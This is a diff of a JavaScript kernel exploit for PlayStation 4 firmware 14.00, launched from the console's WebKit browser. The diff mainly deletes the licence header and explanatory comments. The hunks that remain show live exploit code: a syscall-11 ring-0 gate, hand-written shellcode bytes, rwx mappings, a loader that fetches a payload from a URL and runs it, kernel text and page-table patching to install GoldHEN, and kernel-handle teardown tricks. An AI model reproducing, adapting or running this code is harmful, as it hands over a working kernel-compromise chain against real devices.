@@ -1,38 +1,3 @@
-/*
-    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
-    Port to the raw13 host (WebKit entry), from the Lua original.
-
-    Copyright (C) 2026 well0nez
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU Affero General Public License as
-    published by the Free Software Foundation, either version 3 of the
-    License, or (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU Affero General Public License for more details.
-
-    You should have received a copy of the GNU Affero General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-    UNTESTED IN THIS HOST. The Lua original has eight consecutive runs behind
-    it inside a game process. This file has none: it has never executed. Run
-    probeAfterglow() first -- it fires nothing and answers whether this process
-    can carry the exploit at all.
-
-    What the host must provide, and raw13 does:
-      sc(num, ...args)      syscall, returns {lo, hi, i32}
-      bufAddr(arrayBuffer)  int64 address of the backing store
-      p.read1/4/8           read in this process
-      p.write1/4/8          write in this process
-      p.readInto(u8, at, n)
-      keepAlive             array, so our buffers survive the collector
-      mark(tag, detail)     log
-    A way to call native code is NOT needed.
-*/
-
 import { int64 } from "./int64.js";
 
 const S = {
@@ -517,16 +482,7 @@ function qAt(buf, off) {
   return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
 }
 
-/* ----------------------------------------- ring 0 through syscall 11 */
 
-/* The bootstrap pointed sysent[11] at a planted `jmp [rsi]`. sy_call is
-   entered with rdi = thread and rsi = the argument vector, so the jump lands
-   on whatever address the first argument carries.
-
-   The original issues this with the loader's native call. A host whose
-   syscall primitive takes an arbitrary number could call syscall 11 straight;
-   raw13's sc() goes through a per-number stub table that has no entry for 11,
-   so the two byte userland stub stays and is entered with callAddr. */
 const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
 const STAGE_MAX = 0x400;
 const SIGIL = 0x600D600D;
@@ -630,20 +586,7 @@ function openRing0(roomAt) {
 
 function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }
 
-/* dynlib_get_info fills the name in this sandbox and nothing else -- no
-   segment array, so no base. The mappings carry their own path, so ask the
-   kernel for the map instead. No blind reads, and it hands over the bounds
-   of the module as well, which the host page check wants anyway. */
-/* The mappings carry no path here, so identity has to come from content. We
-   already know fifteen byte patterns at fixed offsets inside this module --
-   that is a far stronger fingerprint than a name. The map supplies the
-   bounds, so every read lands inside a mapping that exists, and only
-   mappings long enough to hold the whole span are touched. */
-/* The kernel walks its vm_map entries in address order and so does this
-   listing, so an index here is the same index there. Kept, because the chain
-   that walks the kernel side has to be told how far to go -- and going four
-   times further than necessary is four times the ring 0 work on a hijacked
-   stack. */
+
 let MAPS = null;
 
 function findLibByShape() {
@@ -695,11 +638,7 @@ function findLibByShape() {
   return r;
 }
 
-/* Reports instead of returning a bare value: when this comes back empty the
-   caller has to know whether the listing failed, the module was absent, or it
-   was there with a zero base -- those need different answers, and a zero
-   int64 is truthy, which is how a zero base once reached a read as a bare
-   gadget offset. */
+
 function findLib(name) {
   const r = { base: null, rv: null, count: 0, seen: [], note: null };
   const list = alloc(4 * 0x300), count = alloc(8);
@@ -744,12 +683,7 @@ function findLib(name) {
   return r;
 }
 
-/* Which core we may run on is not ours to choose: this process is confined
-   to a subset, and in a browser that subset does not contain core 0. Setting
-   bit 0 regardless fails, the thread stays free to migrate, and then the free
-   and the refill land in different per cpu buckets -- the hole is filled by
-   somebody else and the pivot takes its stack pointer from a stranger. So ask
-   first, then pin to the lowest core actually allowed. */
+
 function pinCore() {
   const mask = alloc(16);
   mask.u8.fill(0);
@@ -768,19 +702,7 @@ function pinCore() {
   return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
 }
 
-/* ------------------------------------------------------- the payload */
 
-/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
-   goes into a page that is executable only because the kernel patch opened
-   rwx, and it runs on its own thread so this one stays free. pthread_create
-   is taken out of WebKit's import table and checked against libkernel before
-   it is called -- a wrong pointer here runs the payload nowhere.
-
-   Must come after the handles are defused: the enabler can restart SceShellUI,
-   and if this process is torn down with the handles still live, that is the
-   hang. */
-/* Fetch a file once. Both loaders are handed the bytes, so deciding the
-   format does not cost a second request. */
 async function fetchBytes(url, tag) {
   try {
     const r = await fetch(url);
@@ -792,25 +714,7 @@ async function fetchBytes(url, tag) {
   }
 }
 
-/* Which loader runs is decided by the CONTENT, not by the file name. There
-   are two forms and they look alike from outside:
-     - composite image: stub area plus payload at 0x50000, exactly
-       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
-       padding RW.
-     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
-       started as a thread.
-   A GoldHEN build of 297,496 bytes is the second form; going by its name it
-   would have taken the composite path and been rejected by the length
-   check. */
 
-/* The 641 byte kernel patch set. It belongs to GOLDHEN, not to the composite
-   image: the blob writes 57 kernel text sites, of which afterglow covers 25 --
-   fifteen from PATCHES and ten more from BOOTSTRAP. The remaining 32 are
-   exactly what GoldHEN's own code expects to find: a block of 29 from
-   0x125791 to 0x125871, plus 0x2fcb5c, 0x391fc6 and 0x3be3c0.
-
-   It runs for both image forms. A raw payload that started without it brought
-   GoldHEN up (FTP answered) but left it running without its patches. */
 async function runPatchSet(room) {
   const c = host();
   let pset = null;
@@ -888,12 +792,6 @@ async function loadPayload(url, vorab) {
     }
   }
 
-  /* The table blanks both pthread_create fields for this firmware, but only
-     one of them deserved it: the import slot is a WebKit offset and this
-     build's WebKit is the 13.52 one, while k_pthread_create is a libkernel
-     offset and libkernel did move. The second was only ever used to check the
-     first, so check it against libkernel's own bounds instead -- a slot that
-     resolves into libkernel is the right slot, whatever the table says. */
   const SLOT_1352 = 0x3cb9c00;
   const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
     ? c.off.wk___imp_pthread_create : SLOT_1352;
@@ -921,21 +819,7 @@ async function loadPayload(url, vorab) {
   return started;
 }
 
-/* ------------------------------------------------------- GoldHEN */
 
-/* This image is not a payload in the sense hen.bin is. The first 0x50000
-   bytes are a stub area -- a gate at 0x47c00, a trampoline at 0x47c40, a
-   marker pair at 0x47e80 -- and the GoldHEN payload proper sits at 0x50000
-   and is 636760 bytes, which together is exactly the file's length. The
-   payload is not run in userland at all: it is copied into the kernel's text
-   padding and main's chain is then driven one call at a time through
-   syscall 11, so that a call which does not come back can be named instead
-   of guessed. This follows the step order established in the Lua work.
-
-   The buffer must be a fresh mmap, not an allocator's: a calloc buffer is
-   not executable throughout -- measured, one page in eighteen -- and a ring 0
-   jump into a page without the bit is a panic without a signal. A fresh
-   mapping is executable throughout once the kernel patch is in. */
 const GH = {
   tor: 0x47c00, tram: 0x47c40, mark: 0x47e80, kptr: 0x47b20,
   nlOff: 0x50000, nlLen: 636760,
@@ -951,7 +835,7 @@ const GH_STEPS = [
   [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
   [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
   [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
-  [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
+  [0x12f53, "notice 'GoldHEN loaded!'", { rdi: 0x99ef3, esi: 0 }],
   [0x32c4,  "inject klog      -> 3232"],
   [0x325a,  "inject FTP       -> 2121"],
   [0x328f,  "inject BinLoader -> 9090"],
@@ -960,19 +844,6 @@ const GH_STEPS = [
   [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
 ];
 
-/* The payload's BSS lives in the kernel's RX text padding, and it writes
-   into it 83 times without bracketing. During main's chain those writes get
-   through because every step is wrapped in wp_off/wp_on; GoldHEN's later
-   syscall hooks run with CR0.WP=1 and fall over -- the delayed death that
-   cost this project a day. One RW bit in the page directory entry that covers
-   the padding fixes it. It does not survive a reboot.
-
-   The Lua version drives every read through GoldHEN's own trampoline because
-   that is its only way into ring 0. We already hold afterglow's gate, so this
-   is plain reads and one write.
-
-   Three cross-checks before anything is written. A guessed read of a kernel
-   address cost two cold starts on the day this was first worked out. */
 const PT = {
   g1: 0x1b2c394, g2: 0x1b2c398, kphys: 0x1b2c420, pmpml4: 0x1b2c3c0,
   padFrom: 0xb3c000, padTo: 0xbe35d8,
@@ -1067,19 +938,10 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
   if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
     say("[g] mprotect rwx failed, errno " + c.errno()); return false;
   }
-  /* Only the trampoline page is ever entered from this mapping. Executability
-     here is per page, and that is measured, not assumed: page 0x47000 carries
-     ring 0 code, page 0 does not -- a three byte probe there took the console
-     (02.11. 14:27). So the gate stub and the trampoline live at 0x47c00/0x47c40
-     and nothing else from this image is ever jumped to. */
+ 
   codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
 
-  /* Before ring 0 is sent in there, ask from ring 3. Touching a page with a
-     write gives it RW and no X; an instruction fetch needs another fault to
-     add it, and that fault taken in ring 0 on a userland page is the
-     documented death. A plain `ret` entered with callAddr runs in ring 3
-     instead: if the page carries no X the WebProcess dies and the console
-     does not. Same question, a page instead of a console. */
+ 
   codeAt(buf, GH.tram + 0x200).hex("c3");
   const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
   if (r3 === undefined || r3 === null) {
@@ -1122,41 +984,9 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
     return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
   };
 
-  /* The Lua chain ran a 641 byte kernel patch set before any of this, and
-     afterglow's own are not the same set: the blob writes 57 kernel text
-     sites, of which afterglow covers 25 -- fifteen from PATCHES, ten from
-     BOOTSTRAP. The 32 it does not -- a block of 29 from 0x125791 to
-     0x125871, plus 0x2fcb5c, 0x391fc6 and 0x3be3c0 -- are what GoldHEN's
-     own code expects to find. The blob is position independent, takes no
-     arguments, fetches the kernel base itself through rdmsr and ends in
-     ret, so it only has to be
-     put somewhere ring 0 may run from. This mapping is, as just measured. */
-  /* It does not go into this mapping. The Lua chain puts it in the libc text
-     tail at rva 0x130730 -- the same room afterglow runs its own ring 0
-     bodies from, and the only region here that is proven executable in ring 0
-     by every call made so far. The three byte test above proved the page at
-     +0x47000 and said nothing about any other, which is exactly the trap the
-     Lua notes warn about: one page in eighteen. 641 bytes fit in the body
-     area, +0xc0 to +0x400. afterglow rebuilds that body on its next use. */
   if (!(await runPatchSet(room))) return false;
 
-  /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
-     kernel base and leave it at +0x47b20, which step 4 then reads back -- we
-     have had that base since [1] and it was checked against the gate at [7],
-     so the two calls buy nothing.
 
-     Skipping them is also what keeps this safe. They sit at image offset
-     0x144d, on the mapping's second page; the trampoline sits at 0x47c40, on
-     a page every call so far has already run from. Executability here is per
-     page -- the Lua notes measured one page in eighteen on an allocator
-     buffer -- and the three byte test proves only the page it ran on. With
-     these two gone, the only code entered from this mapping is the
-     trampoline, and everything else runs from the kernel's own padding. */
-  /* The pre-stage calls 0x144d and 0xce9 only to work out the kernel base and
-     leave it at +0x47b20. We have had that base since [1] and checked it
-     against the gate at [7], and those two sit on a page ring 0 may not run
-     from -- so they stay skipped and the value is written as they would have
-     left it. */
   const kb = kbase;
   t = plus(kb, GH.rvaPad);
   wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
@@ -1210,30 +1040,11 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
   return silent === 0;
 }
 
-/* ------------------------------------------------- defusing the handles */
-
-/* Every attempt leaves device handles and a queue behind. Closing them during
-   the run kills the console; leaving them kills it when the process dies,
-   because neither teardown finishes -- the device close ends in
-   destroy_dev_sched, and closing a queue walks its notes and detaches each
-   one from a device that is gone.
-
-   So neither path is taken. Both operation tables are copied into the zero
-   filled tail of kernel text, the close entry of each copy is pointed at an
-   `xor eax,eax ; ret`, and the handles are rehung onto the copies. The cdevs
-   leak until reboot, which is harmless.
-
-   In a browser this is not optional and not something to do later: the page
-   can go away at any moment, and that moment is the one that hangs. */
 const PADDING = 0x0b39d98;
 const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
 const RET0 = 0x00c3c031;             /* xor eax,eax ; ret */
 
-/* The rehang used to be two ring 0 reads and sometimes a write per handle,
-   each its own gate entry -- some 660 of them for 220 handles, in a row. The
-   same arithmetic as the spray: put the loop in ring 0 and it is one entry.
-   The two bodies below were checked against a disassembler before they were
-   ever sent, because a wrong jump displacement here is a dead console. */
+
 function rehangRing0(k, room, ofs, list, from, copy) {
   if (!list.length || list.length > 256 || !from) return null;
   for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
@@ -1350,12 +1161,7 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   }
   say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");
 
-  /* A neutralised close entry is not the whole story: exit1() also runs
-     knote_fdclose() for every descriptor, and that does not go through
-     fo_close. Our notes hang on clones freed long ago, so walking them at
-     exit reads dead memory. kqueue_close takes the note array length from
-     the high half of the quadword at kq+0xa0; with it at zero nothing is
-     walked at all. */
+
   let notes = 0;
   for (let i = 0; queues && i < queues.length; i++) {
     const f = fileOf(queues[i]);
@@ -1563,11 +1369,7 @@ async function attempt(ctx, opts) {
   }
   say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
 
-  /* Is the kernel already open? A reload on a console that has been done once
-     would otherwise burn triggers against a kernel that is already patched --
-     and the enabler restarting SceShellUI is exactly what makes the browser
-     reload. rwx mmap is the cheapest question that only answers yes after a
-     successful run. */
+
   {
     const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
     if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
@@ -1627,12 +1429,7 @@ async function attempt(ctx, opts) {
       }
     }
 
-    /* One pointer is enough on its own: the base sits on a 16 KiB grid, so
-       the anchor can only ever show up at a single offset within a page. This
-       runs even when the signature matched, because two methods that agree
-       are worth more than one that cannot be checked -- and a wrong base
-       sends the next chain straight through a nonsense descriptor table,
-       which is the likeliest way this step takes the console with it. */
+
     let voted = null;
     {
       const mark = K.anchor % 0x4000, tally = {};
@@ -1700,9 +1497,7 @@ async function attempt(ctx, opts) {
   say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
       + " bytes of spare room behind libc");
 
-  /* How far the kernel side has to be walked. The listing already told us
-     where the host page sits; one entry of slack, and never more than the
-     table we allocated for. */
+
   let reach = TUNE.entries;
   if (MAPS) {
     for (let i = 0; i < MAPS.length; i++) {
@@ -1719,10 +1514,7 @@ async function attempt(ctx, opts) {
   const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
   wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);
 
-  /* Four shots or three: the walk through the mapping list can ride along
-     with the handle chain or cost a shot of its own. Separate is the form
-     that has evidence behind it; merged is one shot fewer, and so one more
-     chance of the hole being won by something else. */
+ 
   const merged = ((ctx.params && ctx.params.get("shots")) || "4") === "3";
 
   const walkLoop = function (c) {
@@ -1893,12 +1685,7 @@ async function attempt(ctx, opts) {
   }
   say("[7] gate is live, thread " + text(thread));
 
-  /* From here the kernel is open AND the handles are armed. Any abort
-     between here and [10] used to leave them that way. The next process exit
-     then ends every fo_close in apmclose -> destroy_dev_sched, the exit never
-     completes, and the browser cannot even be restarted -- closing it IS that
-     exit. Only a console restart recovers from it. `ofs` hangs off `thread`
-     alone, so it can be derived here. */
+
   const failOut = function (why) {
     say(why);
     try {
@@ -1991,15 +1778,10 @@ async function attempt(ctx, opts) {
     },
     read8: function (at) { return k.read_v(at); },
     write8: function (at, q) { return k.write_v(at, q); },
-    /* On this platform the loader tables are text relative -- the PS4 row
-       carries PRISON0 0x111fa18 and ROOTVNODE 0x2136e90, the same values used
-       above against this base -- so data_base holds it too. */
+
     data_base: kbase,
   };
 
-  /* Every attempt leaves device handles and a queue behind. Closing them now
-     kills the console, and leaving them kills it when the process exits.
-     release_handles does neither; it has to run before anything closes. */
   iface.devs = shot.devs;
   iface.queues = shot.queues;
   if (ctx.state) ctx.state.afterglow = iface;
@@ -2016,21 +1798,15 @@ async function attempt(ctx, opts) {
   const want = (ctx.params && ctx.params.get("payload"));
   const mode = (ctx.params && ctx.params.get("mode")) || "";
   if (want !== "") {
-    iface.payload = (mode === "goldhen")
-      ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
-      : await loadPayload(want || "hen.bin");
+    iface.payload = await loadEnabler(want || "goldhen.bin", k, kbase, hostFree);
   }
   say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"
       + (iface.payload ? ", enabler running" : ""));
   return iface;
 }
 
-/* An attempt that fell short leaves its handles live, and those are only
-   defused once step 10 is reached -- so stopping on a recoverable miss is the
-   worst of both: nothing gained, and a process that hangs when the page goes
-   away. The kernel base survives in STATE, so a second attempt skips the leak
-   and costs only triggers. A spent budget, or anything that already touched
-   the kernel, is not retried. */
+
+
 export async function runAfterglow(ctx, opts) {
   const max = (opts && opts.tries) || 4;
   for (let n = 1; n <= max; n++) {
